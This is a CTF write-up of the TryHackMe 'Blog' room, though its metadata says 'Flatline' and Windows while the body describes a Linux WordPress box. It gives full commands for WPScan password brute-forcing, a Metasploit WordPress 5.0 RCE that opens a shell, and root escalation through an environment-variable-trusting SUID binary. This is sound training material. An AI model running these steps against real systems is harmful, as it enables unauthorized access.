---
weight: 3
title: "CTF writeup - Flatline"
date: 2021-05-21T22:15:40+08:00
lastmod: 2022-08-29T17:16:40+08:00
description: "Another late night CTF on the awesome platform TryHackMe"
featuredImage: "tryhackmebanner.jpg"
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Windows"]
categories: ["Writeups"]

lightgallery: false
summary: The tags on this box tells us that it involves Windows, privesc, RCE and enumeration.
---

# TryHackMe: Blog

![Untitled](blog/headlogo.png)

"Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole..."

After reading the description of this room we know that its a box running Wordpress.

# Scanning & Enumeration

## NMAP

```bash
**nmap -sV -sC -A -T4 -p- 10.10.67.202**
```

{{< figure src="/blog/nmap_scan.png">}}

It shows us some Windows services like SMB and the admin interface for the wordpress site.

## Enum4linux

Lets check out SMB first.

```bash
enum4linux -a blog.thm
```

{{< figure src="/blog/enum4linux.png">}}

We got some shares and user names! Lets try and poke the BillySMB share with smbclient.

## SMBclient

```bash
smbclient [//blog.thm/BillySMB](https://blog.thm/BillySMB) -N
```

{{< figure src="/blog/smbclient.png">}}

Looks like we're chasing rabbits. This was a dead end...

# Gaining Access

Moving on to the wordpress site on port 80, we can see in the robots.txt that theres a /wp-admin/ page.

{{< figure src="/blog/login_portal.png">}}

We can enumerate users and try to password spray or brute force this login form with WPScan.

## WPScan

```bash
wpscan --url [http://blog.thm](http://blog.thm/) --enumerate u
```

{{< figure src="/blog/wpscan.png">}}

We also find some other interesting stuff, like XML-RPC etc.

Now that we know the user names, we can try to log in to the Wordpress admin panel.

```bash
wpscan --password-attack wp-login --usernames bjoel,kwheel --passwords /home/kali/wordlists/rockyou.txt --url  [http://blog.thm/wp-login.php](http://blog.thm/wp-login.php)
```

{{< figure src="/blog/password_attack.png">}}

SUCCESS! We found the password and we are now in the admin page area of the Wordpress blog:

{{< figure src="/blog/wp_admin.png">}}

Perhaps we can get a shell from here and gain initial access into the box...
We know that the WordPress version is running version 5.0, where WPScan revealed a known vulnerability.

Perhaps searchsploit has some info?

# Exploitation

```bash
searchsploit wordpress 5
```

{{< figure src="/blog/searchsploit.png">}}

This one looks interesting. A shell upload. Just what we were looking for.

Copying the shell to our working dir, and we inspect it with sublime text editor:

{{< figure src="/blog/copy_shell.png">}}

Apparently, this is a metasploit module which exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 <= 4.9.8.
It needs a user with “author” privileges to work.
Luckily for us, our Karen user has the right privileges.

## Reverse shell

And we got ourselves a nice meterpreter interactive session!

{{< figure src="/blog/meterpreter.png">}}

Time to enumerate some more...

# Privilege Escalation

The room wants us to find “user.txt”.
A quick search reveals it, but it looks like another dead end...

```bash
find / -name "user.txt" 2>/dev/null
```

{{< figure src="/blog/find_files1.png">}}

I usually upload linpeas or enum4linux or something like that, to automatically look for easy privilege escalation techniques.
But first, I always do a quick search for SUID binary files.

## SUID binary

```bash
find / -perm -u=s -type f 2>/dev/null
```

Interesting...the usual suspects are listed, but there is one among them that stands out.
I have never seen this binary “checker” before on GTFObins.

{{< figure src="/blog/meterpreter.png">}}

```bash

ls -lah /usr/sbin/checker
-rwsr-sr-x 1 root root 8.3K May 26  2020 checker
```

We can see that this binary will execute as root when we run it.

{{< figure src="/blog/rootbinary1.png">}}

It throws us an error code when we try to run it...
Lets check it out with ltrace

```bash
ltrace /usr/sbin/checker
/checker
Not an Admin
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

Analyzing the output, we can see that it just checks if we are admin with **getenv**.
We can modify this...

```bash
export admin=1
```

Now when we inspect the binary again:

{{< figure src="/blog/rootbinary2.png">}}

We are apparently set as admin and it runs bash, which will execute as root.

```bash

./usr/sbin/checker
whoami
```

{{< figure src="/blog/whoami.png">}}

Now we can finish up the room, and get the two flags!

```bash
find / -name "root.txt" 2>/dev/null
/root/root.txt
find / -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
cat /root/root.txt
cat /media/usb/user.txt
```

{{< figure src="/blog/rootbinary3.png">}}